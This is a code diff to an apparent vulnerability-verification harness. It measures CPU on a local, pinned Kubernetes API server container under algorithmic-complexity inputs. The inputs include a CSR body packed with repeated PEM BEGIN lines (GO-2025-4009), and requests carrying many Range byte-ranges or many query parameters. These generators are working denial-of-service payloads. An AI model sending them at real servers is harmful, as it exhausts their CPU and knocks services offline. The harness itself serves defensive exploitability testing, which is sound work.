@@ -290,7 +290,7 @@ class Target:
         if self._published_port(int(self.rt.get("port", 6443))) != self.port:
             raise SystemExit("refusing: the published port changed")
 
-    def request(self, method, path, headers, auth=True, timeout=600, verified=False):
+    def request(self, method, path, headers, auth=True, timeout=600, verified=False, body=None):
         if not verified:  # verified=True only right after an explicit verify_target() by the caller
             self.verify_target()
         h = dict(headers)
@@ -300,7 +300,7 @@ class Target:
         c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=timeout)
         c.connect = _connect_pinned(c, self.port, self.ident)
         t = time.time()
-        c.request(method, path, headers=h)
+        c.request(method, path, body=body, headers=h)
         r = c.getresponse()
         body = r.read()
         c.close()
@@ -309,7 +309,16 @@ class Target:
         return r.status, len(body), time.time() - t
 
     def cpu(self):
-        """utime + stime of the target process (all threads), in seconds; read on the host (no exec latency)"""
+        """CPU seconds used by the target: runtime.cpuCounter "cgroup" reads the container cgroup's cpu.stat
+        usage_usec (microseconds, every process of the container); default "proc" reads utime + stime of the target
+        process (all threads, clock ticks). Both on the host (no exec latency)."""
+        if self.rt.get("cpuCounter") == "cgroup":
+            if not hasattr(self, "_cg"):
+                self._cg = next(ln.split("::", 1)[1].strip() for ln in open(f"/proc/{self.pid}/cgroup") if ln.startswith("0::"))
+            for ln in open(f"/sys/fs/cgroup{self._cg}/cpu.stat"):
+                if ln.startswith("usage_usec "):
+                    return int(ln.split()[1]) / 1e6
+            raise SystemExit("cpu.stat usage_usec not found")
         try:
             f = open(f"/proc/{self.pid}/stat").read().rsplit(")", 1)[1].split()
         except OSError:
@@ -366,9 +375,32 @@ def payload(req, params, mark=None):
     if p["generator"] == "http-range":
         first = [f"{mark}-{mark}"] if mark is not None else ["0-0"]
         headers[p.get("header", "Range")] = "bytes=" + ",".join(first + [f"{2 * i}-{2 * i}" for i in range(1, n)])
-    elif p["generator"] == "query-params":
-        path += ("&" if "?" in path else "?") + "&".join(f"p{i}=1" for i in range(n))
+    elif p["generator"] == "query-params":  # with a marker, the first parameter's name carries it; count unchanged
+        first = [f"m{mark}=1"] if mark is not None else ["p0=1"]
+        path += ("&" if "?" in path else "?") + "&".join(first + [f"p{i}=1" for i in range(1, n)])
     return path, headers
+
+
+def csr_pem(n, mark=None):
+    """GO-2025-4009 input class (from Go's fix, CL "encoding/pem: make Decode complexity linear"): n BEGIN lines and
+    one END line at the end. n < 0 is the size-matched control: |n| filler lines of the same length and no BEGIN line.
+    A marker line, if any, comes first (text before the first BEGIN is ignored by PEM decoding)."""
+    head = f"m{mark}\n" if mark is not None else ""
+    line = "-----BEGIN A-----\n" if n >= 0 else "xxxxxxxxxxxxxxxxx\n"
+    return (head + line * abs(n) + "-----END A-----\n").encode()
+
+
+def payload_body(req, params, mark=None):
+    """request body for generators that need one (None otherwise)"""
+    p = req.get("payload") or {}
+    if p.get("generator") != "csr-pem":
+        return None
+    import base64
+    n = int(re.sub(r"\{\{(\w+)\}\}", lambda m: str(params[m.group(1)]), str(p.get("count", "1"))))
+    return json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
+                       "metadata": {"name": "vexproof-lab-csr"},
+                       "spec": {"request": base64.b64encode(csr_pem(n, mark)).decode(),
+                                "signerName": "kubernetes.io/kube-apiserver-client", "usages": ["client auth"]}}).encode()
 
 
 # ---------- oracle ----------
@@ -376,7 +408,9 @@ def payload(req, params, mark=None):
 def when_ok(expr, params):
     if not expr:
         return True
-    m = re.fullmatch(r"\s*(\w+)\s*(>=|<=|>|<|==)\s*(\d+)\s*", expr)
+    m = re.fullmatch(r"\s*(\w+)\s*(>=|<=|>|<|==)\s*(-?\d+)\s*", expr)
+    if not m:
+        raise SystemExit(f"bad condition {expr!r}: NAME OP INTEGER")
     v, op, x = params[m.group(1)], m.group(2), int(m.group(3))
     return {">": v > x, "<": v < x, ">=": v >= x, "<=": v <= x, "==": v == x}[op]
 
@@ -409,7 +443,7 @@ def evaluate(oracle, rows, pname):
                 sp = e["separation"]
                 benign = [r["server_cpu_s"] for r in a if when_ok(sp["benign"], {pname: r[pname]})]
                 trig = [r["server_cpu_s"] for r in a if r in sel]
-                ok = bool(benign) and bool(trig) and min(trig) > sp.get("factor", 5) * max(max(benign), 0.01)
+                ok = bool(benign) and bool(trig) and min(trig) > sp.get("factor", 5) * max(max(benign), sp.get("floor", 0.01))
                 res["checks"].append({"check": f"{arm}: min CPU at {rule.get('when')} > {sp.get('factor', 5)} x max CPU at {sp['benign']}",
                                       "observed": {"benign": [min(benign or [0]), statistics.median(benign or [0]), max(benign or [0])],
                                                    "trigger": [min(trig or [0]), statistics.median(trig or [0]), max(trig or [0])]},
@@ -418,11 +452,19 @@ def evaluate(oracle, rows, pname):
                 mb = e["maxCPUBelow"]
                 ref = [r["server_cpu_s"] for r in rows if r["arm"] == mb["arm"] and when_ok(mb["when"], {pname: r[pname]})]
                 trig = [r["server_cpu_s"] for r in a if r in sel]
-                cap = mb.get("factor", 5) * max(statistics.median(ref), 0.01) if ref else None
+                cap = mb.get("factor", 5) * max(statistics.median(ref), mb.get("floor", 0.01)) if ref else None
                 res["checks"].append({"check": f"{arm}: max CPU at {rule.get('when')} < {mb.get('factor', 5)} x median CPU of "
-                                               f"{mb['arm']} at {mb['when']} (floor 0.01 s)",
+                                               f"{mb['arm']} at {mb['when']} (floor {mb.get('floor', 0.01)} s)",
                                       "observed": {"max": max(trig or [0]), "cap": cap},
                                       "ok": bool(trig) and cap is not None and max(trig) < cap})
+            if "belowArm" in e:  # suppression: factor x this arm's largest CPU < the reference arm's smallest CPU
+                ba = e["belowArm"]
+                ref = [r["server_cpu_s"] for r in rows if r["arm"] == ba["arm"] and when_ok(ba["when"], {pname: r[pname]})]
+                trig = [r["server_cpu_s"] for r in a if r in sel]
+                res["checks"].append({"check": f"{arm}: {ba.get('factor', 5)} x max CPU at {rule.get('when')} < min CPU of "
+                                               f"{ba['arm']} at {ba['when']}",
+                                      "observed": {"max": max(trig or [0]), "ref_min": min(ref or [0])},
+                                      "ok": bool(trig) and bool(ref) and ba.get("factor", 5) * max(trig) < min(ref)})
             if "serverCPUMax" in e:
                 cap = float(e["serverCPUMax"].rstrip("s"))
                 res["checks"].append({"check": f"{arm}: median CPU <= {cap}s", "observed": med,
@@ -436,6 +478,10 @@ def evaluate(oracle, rows, pname):
         res["ok"] = bool(res["checks"]) and all(c["ok"] for c in res["checks"])
         out.append(res)
     return out
+
+
+def file_sha256(path):
+    return hashlib.sha256(open(path, "rb").read()).hexdigest()
 
 
 def check_spec(spec):
@@ -456,7 +502,8 @@ def check_spec(spec):
         pname = next(iter(trig.get("parameters", {"n": [1]})))
         for v in trig.get("parameters", {pname: [1]})[pname]:
             pth, hdr = payload(trig["request"], {pname: v})
-            if len(pth) + sum(len(k) + len(x) for k, x in hdr.items()) > cap:
+            body = payload_body(trig["request"], {pname: v})
+            if len(pth) + sum(len(k) + len(x) for k, x in hdr.items()) + len(body or b"") > cap:
                 raise SystemExit(f"refusing: request for {pname}={v} exceeds safety.maxRequestBytes")
 
 
@@ -475,6 +522,19 @@ def e2a_window(spec, run, t, path, bi, cache):
     facts.update(symbol=att["symbol"], offset=hex(off), registers=att["registers"])
     pid = int(sh(ENGINE, "inspect", "-f", "{{.State.Pid}}", f"{t.name}-target").strip())
     return attribution.ArgWindow(run, pid, os.path.abspath(path), off, att["registers"]), facts
+
+
+def argument_bytes(att, path, headers, params=None, mark=None):
+    """the bytes the OSV symbol is expected to receive: a request header's value, the raw query string, or the PEM
+    data carried (base64) in a CSR body"""
+    arg = att["argument"]
+    if "header" in arg:
+        return headers[arg["header"]].encode()
+    if arg.get("query"):
+        return path.split("?", 1)[1].encode()
+    if arg.get("csrPem"):
+        return csr_pem(int(next(iter(params.values()))), mark)
+    raise SystemExit("attribution.argument: {header: NAME}, {query: true} or {csrPem: true}")
 
 
 def row1(spec, ev, controls, verdict, e2a):
@@ -538,7 +598,11 @@ def main():
     fixes = stdlib_fixes(osv)
     b = spec.get("build", {})
     tags = bi["tags"] if b.get("tags", "auto") == "auto" else b["tags"]
-    resolved = {"shipped_sha256": digest, "shipped_go": bi["go"], "tags": tags, "goos": bi["goos"],
+    here = os.path.dirname(os.path.abspath(__file__))
+    resolved = {"osv": spec["vulnerability"]["osv"], "spec_sha256": file_sha256(A.spec),
+                "runner_sha256": file_sha256(os.path.join(here, "runner.py")),
+                "attribution_sha256": file_sha256(os.path.join(here, "attribution.py")),
+                "shipped_sha256": digest, "shipped_go": bi["go"], "tags": tags, "goos": bi["goos"],
                 "git_version": bi["git_version"], "git_commit": bi["git_commit"], "ref_check": ref_check,
                 "osv_fixed_go": fixes, "engine": ENGINE, "arms": {}}
     if ref_check.startswith("mismatch"):
@@ -592,26 +656,34 @@ def main():
                     for v in att["calibration"]:  # benign inputs with known bytes, sent inside the window
                         mk = attribution.marker()
                         pth, hdr = payload(trig["request"], {pname: v}, mk)
-                        calib[mk] = hdr[att["argument"]["header"]].encode()
-                        t.request(trig["request"]["method"], pth, hdr)
+                        calib[mk] = argument_bytes(att, pth, hdr, {pname: v}, mk)
+                        body = payload_body(trig["request"], {pname: v}, mk)
+                        t.request(trig["request"]["method"], pth,
+                                  {**hdr, "Content-Type": "application/json"} if body is not None else hdr, body=body)
                 ncpu, cpuinfo = t.cpus_allowed()
                 resolved["arms"][arm["name"]]["cpu_bound"] = cpuinfo
-                tick = 1 / os.sysconf("SC_CLK_TCK")
+                # read granularity of one CPU reading: a clock tick for /proc, 1 ms for the cgroup counter
+                tick = 0.0005 if spec["runtime"].get("cpuCounter") == "cgroup" else 1 / os.sysconf("SC_CLK_TCK")
+                digits = 4 if spec["runtime"].get("cpuCounter") == "cgroup" else 2
                 for v, k in itertools.product(values, range(trig["repeats"])):
                     mk = attribution.marker() if marked and v != 0 else None
                     pth, hdr = payload(trig["request"], {pname: v}, mk)
+                    body = payload_body(trig["request"], {pname: v}, mk)
+                    if body is not None:
+                        hdr = {**hdr, "Content-Type": "application/json"}
                     t.verify_target()
                     w0 = time.monotonic()
                     c0 = t.cpu()
                     try:
                         st, size, dt = t.request(trig["request"]["method"], pth, hdr,
-                                                 timeout=spec["safety"].get("timeoutSeconds", 600), verified=True)
+                                                 timeout=spec["safety"].get("timeoutSeconds", 600), verified=True,
+                                                 body=body)
                     except (OSError, http.client.HTTPException, ssl.SSLError) as ex:
                         harness.append({"arm": arm["name"], pname: v, "repeat": k + 1, "error": type(ex).__name__})
                         continue
                     c1 = t.cpu()
                     win_s = time.monotonic() - w0  # encloses both CPU reads
-                    cpu_s = round(c1 - c0, 2)
+                    cpu_s = round(c1 - c0, digits)
                     rows.append({"arm": arm["name"], pname: v, "repeat": k + 1, "status": st, "body_bytes": size,
                                  "seconds": round(dt, 3), "server_cpu_s": cpu_s, "window_s": round(win_s, 3),
                                  "cpus_allowed": ncpu})
@@ -622,7 +694,7 @@ def main():
                                         "server_cpu_s": cpu_s, "window_s": round(win_s, 3), "cpus_allowed": ncpu})
                     time.sleep(0.5)  # pause between requests, outside the measurement window
                     if win and mk is not None:
-                        (sent if when_ok(att["trigger"], {pname: v}) else others)[mk] = hdr[att["argument"]["header"]].encode()
+                        (sent if when_ok(att["trigger"], {pname: v}) else others)[mk] = argument_bytes(att, pth, hdr, {pname: v}, mk)
                 if win:
                     script, stats = win.stop()
                     win = None
